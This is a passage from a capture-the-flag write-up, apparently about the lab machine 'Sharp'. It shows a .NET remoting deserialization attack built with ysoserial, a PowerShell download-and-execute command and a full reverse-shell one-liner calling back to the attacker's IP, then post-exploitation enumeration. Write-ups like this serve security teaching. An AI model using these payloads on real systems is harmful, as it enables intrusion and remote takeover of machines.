</span><span class="n">Serving</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="p">::</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="nx">8090</span><span class="w"> </span><span class="p">(</span><span class="n">http://</span><span class="p">[::]:</span><span class="nx">8090/</span><span class="p">)</span><span class="w"> </span><span class="o">...</span><span class="w">
</span><span class="p">::</span><span class="n">ffff:10.10.10.219</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">[</span><span class="mi">23</span><span class="n">/Apr/2021</span><span class="w"> </span><span class="nx">21:06:54</span><span class="p">]</span><span class="w"> </span><span class="s2">"GET / HTTP/1.1"</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span><span class="w">
</span></pre></table></code></div></div><p>But the payload still executed. I wondered if I was able to send myself a reverse shell</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\ysoserial.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">TypeConfuseDelegate</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.172:8090/test.ps1')"</span><span class="w">
</span><span class="n">At</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:1</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="o">.</span><span class="n">\ysoserial.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">TypeConfuseDelegate</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">...</span><span class="w">
</span><span class="o">+</span><span class="w"> </span><span class="n">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><span class="w">
</span><span class="nx">This</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="nx">contains</span><span class="w"> </span><span class="nx">malicious</span><span class="w"> </span><span class="nx">content</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">blocked</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">your</span><span class="w"> </span><span class="nx">antivirus</span><span class="w"> </span><span class="nx">software.</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="n">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">ParserError:</span><span class="w"> </span><span class="p">(:)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="n">ParentContainsErrorRecordException</span><span class="w">
    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ScriptContainedMaliciousContent</span><span class="w">
</span></pre></table></code></div></div><p>My Windows VM did not like me trying to base64 encode this string, since using IEX to execute things from the web has been deemed to be only used for malicious purposes :P</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\ysoserial.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">TypeConfuseDelegate</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.172:8090/test.ps1')"</span><span class="w">
</span><span class="n">AAEAAAD/////AQAAAAAAAAAMA</span><span class="w">
</span></pre></table></code></div></div><p>I was able to compile my payload after disabling my antivirus</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">powershell</span><span class="w"> </span><span class="nt">-NoP</span><span class="w"> </span><span class="nt">-NonI</span><span class="w"> </span><span class="nt">-W</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nt">-Exec</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="nx">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"10.10.14.172"</span><span class="p">,</span><span class="mi">8091</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></pre></table></code></div></div><p>My powershell reverse shell script</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>::ffff:10.10.10.219 - - [23/Apr/2021 21:21:53] "GET /test.ps1 HTTP/1.1" 200 -
</pre></table></code></div></div><p>I executed my payload, which downloaded my powershell script, but unfortunately did not seem to work as I did not get any connections to my netcat listener. I decided to try checking if I could get the script to ping my machine</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-16-ping-success.png" alt="Wireshark output showing that I could successfully ping my machine from the victim" /></p><p>I was able to sucessfully execute the script on the remote machine, so I tried finding a different reverse shell</p><ul><li>https://github.com/ivan-sincek/powershell-reverse-tcp</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release&gt; .\ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.172:8090/test2.ps1')"
</pre></table></code></div></div><p>I saved this new reverse shell to test2.ps1 and created a new base64 stream with <code class="language-plaintext highlighter-rouge">ysoserial.exe</code>.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release</span><span class="err">&gt;</span><span class="w"> </span><span class="o">..</span><span class="nx">/ExploitRemotingService.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">--ver</span><span class="o">=</span><span class="mi">4</span><span class="w"> </span><span class="nt">--user</span><span class="o">=</span><span class="n">debug</span><span class="w"> </span><span class="nt">--pass</span><span class="o">=</span><span class="s2">"SharpApplicationDebugUserPassword123!"</span><span class="w"> </span><span class="n">tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="nx">AAEAAAD/////AQAAAAAAAAA</span><span class="w">
</span></pre></table></code></div></div><p>Then I executed my payload</p><h2 id="initial-foothold">Initial Foothold</h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\ncat.exe</span><span class="w"> </span><span class="nt">-lvn</span><span class="w"> </span><span class="nx">9000</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Version</span><span class="w"> </span><span class="nx">5.59BETA1</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">http://nmap.org/ncat</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">0.0.0.0:9000</span><span class="w">
</span><span class="n">Ncat:</span><span class="w"> </span><span class="nx">Connection</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">10.10.10.219:49722.</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="n">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="o">----------------</span><span class="w">

</span><span class="n">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">  </span><span class="nx">SID</span><span class="w">
</span><span class="o">==========</span><span class="w"> </span><span class="o">============================================</span><span class="w">
</span><span class="n">sharp\lars</span><span class="w"> </span><span class="nx">S-1-5-21-294878639-2649470188-886412631-1007</span><span class="w">


</span><span class="n">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="o">-----------------</span><span class="w">

</span><span class="n">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                             </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">                                          </span><span class="nx">Attributes</span><span class="w">

</span><span class="o">======================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============================================</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
</span><span class="n">Everyone</span><span class="w">                               </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">                                      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">SHARP\dev</span><span class="w">                              </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-21-294878639-2649470188-886412631-1001</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">BUILTIN\Users</span><span class="w">                          </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w">                                 </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\INTERACTIVE</span><span class="w">               </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-4</span><span class="w">                                      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">CONSOLE</span><span class="w"> </span><span class="nx">LOGON</span><span class="w">                          </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-2-1</span><span class="w">                                      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">                                     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">         </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">                                     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Local</span><span class="w"> </span><span class="nx">account</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-113</span><span class="w">                                    </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">LOCAL</span><span class="w">                                  </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-2-0</span><span class="w">                                      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">                                  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="n">Mandatory</span><span class="w"> </span><span class="nx">Label\Medium</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w"> </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-8192</span><span class="w">



</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="o">----------------------</span><span class="w">

</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">========</span><span class="w">
</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Disabled</span><span class="w">
</span></pre></table></code></div></div><p>Using this reverse shell I was finaly able to get a connection back, and was logged in as <code class="language-plaintext highlighter-rouge">lars</code>. Unfortunately this user did not have any interesting privileges or group memberships.</p><h3 id="usertxt">user.txt</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">cd</span><span class="w"> </span><span class="nx">~/Desktop</span><span class="w">
</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">ls</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\lars\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
</span><span class="nt">-ar</span><span class="o">---</span><span class="w">        </span><span class="mi">4</span><span class="n">/23/2021</span><span class="w">   </span><span class="nx">3:25</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">34</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">


</span><span class="n">PS</span><span class="err">&gt;</span><span class="nx">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
</span><span class="n">a1958a13561e7816025222d37e3d12a3</span><span class="w">
</span></pre></table></code></div></div><p>I found the user flag on <code class="language-plaintext highlighter-rouge">lars</code>’ Desktop.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user-lars">Enumeration as user <code class="language-plaintext highlighter-rouge">lars</code></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="err">&gt;</span><span class="nx">computerinfo</span><span class="w">


</span><span class="n">WindowsBuildLabEx</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">17763.1.amd64fre.rs5_release.180914-1434</span><span class="w">
</span><span class="n">WindowsCurrentVersion</span><span class="w">                                   </span><span class="p">:</span><span class="w"> </span><span class="nx">6.3</span><span class="w">
</span><span class="n">WindowsEditionId</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="nx">ServerDatacenter</span><span class="w">
</span><span class="n">WindowsInstallationType</span><span class="w">                                 </span><span class="p">:</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">Core</span><span class="w">
</span><span class="n">WindowsInstallDateFromRegistry</span><span class="w">                          </span><span class="p">:</span><span class="w"> </span><span class="nx">11/12/2020</span><span class="w"> </span><span class="nx">4:57:36</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">WindowsProductId</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="nx">00430-10710-91142-AA482</span><span class="w">
</span><span class="n">WindowsProductName</span><span class="w">                                      </span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">2019</span><span class="w"> </span><span class="nx">Datacenter</span><span class="w">
</span><span class="n">WindowsRegisteredOrganization</span><span class="w">                           </span><span class="p">:</span><span class="w"> </span><span class="nx">Managed</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">Terraform</span><span class="w">
</span><span class="n">WindowsRegisteredOwner</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
</span><span class="n">WindowsSystemRoot</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Windows</span><span class="w">
</span><span class="n">WindowsVersion</span><span class="w">                                          </span><span class="p">:</span><span class="w"> </span><span class="nx">1809</span><span class="w">
</span><span class="n">BiosCharacteristics</span><span class="w">                                     </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="o">...</span><span class="p">}</span><span class="w">
</span><span class="n">BiosBIOSVersion</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">INTEL</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">6040000</span><span class="p">,</span><span class="w"> </span><span class="nx">PhoenixBIOS</span><span class="w"> </span><span class="nx">4.0</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">6.0</span><span class="w">     </span><span class="p">}</span><span class="w">
</span><span class="n">BiosBuildNumber</span><span class="w">                                         </span><span class="p">:</span><span class="w">
</span><span class="n">BiosCaption</span><span class="w">                                             </span><span class="p">:</span><span class="w"> </span><span class="nx">PhoenixBIOS</span><span class="w"> </span><span class="nx">4.0</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">6.0</span><span class="w">
</span><span class="n">BiosCodeSet</span><span class="w">                                             </span><span class="p">:</span><span class="w">
</span><span class="n">BiosCurrentLanguage</span><span class="w">                                     </span><span class="p">:</span><span class="w">
</span><span class="n">BiosDescription</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="nx">PhoenixBIOS</span><span class="w"> </span><span class="nx">4.0</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">6.0</span><span class="w">
</span><span class="n">BiosEmbeddedControllerMajorVersion</span><span class="w">                      </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">BiosEmbeddedControllerMinorVersion</span><span class="w">                      </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">BiosFirmwareType</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="nx">Bios</span><span class="w">
</span><span class="n">BiosIdentificationCode</span><span class="w">                                  </span><span class="p">:</span><span class="w">
</span><span class="n">BiosInstallableLanguages</span><span class="w">                                </span><span class="p">:</span><span class="w">
</span><span class="n">BiosInstallDate</span><span class="w">                                         </span><span class="p">:</span><span class="w">
</span><span class="n">BiosLanguageEdition</span><span class="w">                                     </span><span class="p">:</span><span class="w">
</span><span class="n">BiosListOfLanguages</span><span class="w">                                     </span><span class="p">:</span><span class="w">
</span><span class="n">BiosManufacturer</span><span class="w">                                        </span><span class="p">:</span><span class="w"> </span><span class="nx">Phoenix</span><span class="w"> </span><span class="nx">Technologies</span><span class="w"> </span><span class="nx">LTD</span><span class="w">
</span><span class="n">BiosName</span><span class="w">                                                </span><span class="p">:</span><span class="w"> </span><span class="nx">PhoenixBIOS</span><span class="w"> </span><span class="nx">4.0</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">6.0</span><span class="w">
</span><span class="n">BiosOtherTargetOS</span><span class="w">                                       </span><span class="p">:</span><span class="w">
</span><span class="n">BiosPrimaryBIOS</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">BiosReleaseDate</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="nx">12/12/2018</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">BiosSeralNumber</span><span class="w">                                         </span><span class="p">:</span><span class="w"> </span><span class="nx">VMware-42</span><span class="w"> </span><span class="nx">39</span><span class="w"> </span><span class="nx">66</span><span class="w"> </span><span class="nx">e6</span><span class="w"> </span><span class="nx">16</span><span class="w"> </span><span class="nx">c8</span><span class="w"> </span><span class="nx">18</span><span class="w"> </span><span class="nx">d5-90</span><span class="w"> </span><span class="nx">1f</span><span class="w"> </span><span class="nx">7d</span><span class="w"> </span><span class="nx">af</span><span class="w"> </span><span class="nx">b5</span><span class="w"> </span><span class="nx">ee</span><span class="w"> </span><span class="nx">c3</span><span class="w"> </span><span class="nx">a2</span><span class="w">
</span><span class="n">BiosSMBIOSBIOSVersion</span><span class="w">                                   </span><span class="p">:</span><span class="w"> </span><span class="nx">6.00</span><span class="w">
</span><span class="n">BiosSMBIOSMajorVersion</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">BiosSMBIOSMinorVersion</span><span class="w">                                  </span><span class="p">:</span><span class="w"> </span><span class="nx">7</span><span class="w">
</span><span class="n">BiosSMBIOSPresent</span><span class="w">                                       </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">BiosSoftwareElementState</span><span class="w">                                </span><span class="p">:</span><span class="w"> </span><span class="nx">Running</span><span class="w">
</span><span class="n">BiosStatus</span><span class="w">                                              </span><span class="p">:</span><span class="w"> </span><span class="nx">OK</span><span class="w">
</span><span class="n">BiosSystemBiosMajorVersion</span><span class="w">                              </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
